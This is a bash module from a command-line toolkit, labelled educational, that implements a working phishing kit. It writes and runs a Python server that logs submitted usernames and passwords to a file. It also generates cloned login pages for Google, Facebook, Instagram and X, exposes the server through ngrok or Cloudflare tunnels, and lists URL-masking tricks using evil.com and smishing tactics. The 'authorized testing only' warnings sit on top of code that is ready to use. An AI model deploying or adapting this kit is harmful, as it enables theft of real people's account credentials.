#===============================================================================
#  phish — Phishing Framework (Educational)
#===============================================================================

cmd_phish() {
  module_banner "phish" "Phishing framework — educational use only"
  local sub="${1:-help}"; shift 2>/dev/null || true

  case "$sub" in
    server|start)    phish_server "$@";;
    page)            phish_page "$@";;
    ngrok)           phish_ngrok "$@";;
    cloudflared)     phish_cloudflared "$@";;
    mask)            phish_mask "$@";;
    sms)             phish_sms "$@";;
    --json)          TX_JSON=true; phish_server;;
    -h|--help)
      echo "Usage: tx phish <subcommand> [args]"
      echo "  server [port]     Start phishing server"
      echo "  page <type>       Generate phishing page"
      echo "  ngrok [port]      Start ngrok tunnel"
      echo "  cloudflared [port] Cloudflare tunnel"
      echo "  mask <url>        URL masking/shortener"
      echo "  sms <number>      SMS phishing (educational)"
      echo ""
      echo -e "  ${RED}⚠ For authorized security testing only!${RESET}"
      ;;
    *) log_error "Unknown: $sub"; exit 1;;
  esac
}

phish_server() {
  local port="${1:-8080}"
  log_section "Phishing Server — Port $port"
  need_cmd python3 || return 1

  cat > /tmp/phish_server.py << 'PYEOF'
import http.server
import sys
import json

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        body = b"<html><body><h1>Phishing Simulation Server</h1><p>This is for educational purposes only.</p>"
        body += b"<form method='POST'><input type='text' name='username'><input type='password' name='password'>"
        body += b"<input type='submit'></form></body></html>"
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        data = self.rfile.read(length).decode()
        print(f"\n[!] Captured: {data}")
        with open('/tmp/phish_log.txt', 'a') as f:
            f.write(data + '\n')
        self.send_response(302)
        self.send_header('Location', 'https://google.com')
        self.end_headers()

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    server = http.server.HTTPServer(('0.0.0.0', port), PhishHandler)
    print(f"[*] Phishing server on 0.0.0.0:{port}")
    print(f"[*] Logging to /tmp/phish_log.txt")
    server.serve_forever()
PYEOF

  log_info "Starting server on 0.0.0.0:$port..."
  log_info "Logs: /tmp/phish_log.txt"
  log_warn "CTRL+C to stop"
  python3 /tmp/phish_server.py "$port"
}

phish_page() {
  local type="${1:-login}"
  log_section "Phishing Page — $type"

  case "$type" in
    login|google)
      cat << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Sign In</title></head>
<body style="font-family:arial;text-align:center;margin-top:100px">
  <h2>Sign In</h2>
  <form method="POST" action="/">
    <input type="text" name="username" placeholder="Email" style="width:300px;padding:10px;margin:5px"><br>
    <input type="password" name="password" placeholder="Password" style="width:300px;padding:10px;margin:5px"><br>
    <input type="submit" value="Sign In" style="padding:10px 30px;background:#1a73e8;color:white;border:none">
  </form>
</body></html>
EOF
      ;;
    facebook)
      cat << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Facebook</title></head>
<body style="font-family:helvetica;text-align:center;margin-top:50px">
  <h1 style="color:#1877f2">facebook</h1>
  <form method="POST" action="/">
    <input type="text" name="email" placeholder="Email or Phone"><br>
    <input type="password" name="pass" placeholder="Password"><br>
    <input type="submit" value="Log In">
  </form>
</body></html>
EOF
      ;;
    instagram)
      cat << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Instagram</title></head>
<body style="font-family:arial;text-align:center;margin-top:80px">
  <h1 style="font-family:cursive">Instagram</h1>
  <form method="POST" action="/">
    <input type="text" name="username" placeholder="Phone number, username, or email"><br>
    <input type="password" name="password" placeholder="Password"><br>
    <input type="submit" value="Log In">
  </form>
</body></html>
EOF
      ;;
    twitter)
      cat << 'EOF'
<!DOCTYPE html>
<html>
<head><title>X / Twitter</title></head>
<body style="font-family:arial;text-align:center;margin-top:80px">
  <h1 style="font-size:40px">𝕏</h1>
  <form method="POST" action="/">
    <input type="text" name="username" placeholder="Phone, email, or username"><br>
    <input type="password" name="password" placeholder="Password"><br>
    <input type="submit" value="Next">
  </form>
</body></html>
EOF
      ;;
    *)
      log_error "Unknown page type. Available: login, facebook, instagram, twitter"
      ;;
  esac
}

phish_ngrok() {
  local port="${1:-8080}"
  log_section "ngrok Tunnel"
  if command -v ngrok &>/dev/null; then
    log_info "Starting ngrok -> localhost:$port"
    ngrok http "$port" 2>/dev/null
  else
    log_warn "ngrok not installed"
    log_info "Download: https://ngrok.com/download"
  fi
}

phish_cloudflared() {
  local port="${1:-8080}"
  log_section "Cloudflare Tunnel"
  if command -v cloudflared &>/dev/null; then
    log_info "Starting cloudflared -> localhost:$port"
    cloudflared tunnel --url "http://localhost:$port" 2>/dev/null
  else
    log_info "Installing cloudflared..."
    if $IS_TERMUX; then
      pkg install -y cloudflared 2>/dev/null || wget -O /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 2>/dev/null
    fi
  fi
}

phish_mask() {
  local url="${1:-https://evil.com}"
  log_section "URL Masking"
  cat <<EOF
  Techniques:
    1. Shortener: bit.ly, tinyurl.com, cutt.ly
    2. Unicode: use homoglyph characters
    3. Subdomain: https://google.com.evil.com
    4. Redirect: https://legit.com/redirect?url=https://evil.com
    5. Data URI: data:text/html;base64,...

  Tools:
    Shorten: curl -s "https://tinyurl.com/api-create.php?url=$url"
    Mask:    https://www.google.com@evil.com
EOF
}

phish_sms() {
  local number="${1:-}"
  [[ -z "$number" ]] && { log_error "Usage: tx phish sms <number>"; return 1; }
  log_section "SMS — $number"
  log_warn "Educational SMS simulation"
  cat <<EOF
  SMS phishing (smishing) techniques:
  - Spoofed sender ID (SMS gateway)
  - Shortened malicious links
  - Urgency/scare tactics
  - Fake security alerts

  ${RED}For authorized testing only. Check local laws before use.${RESET}
EOF
}
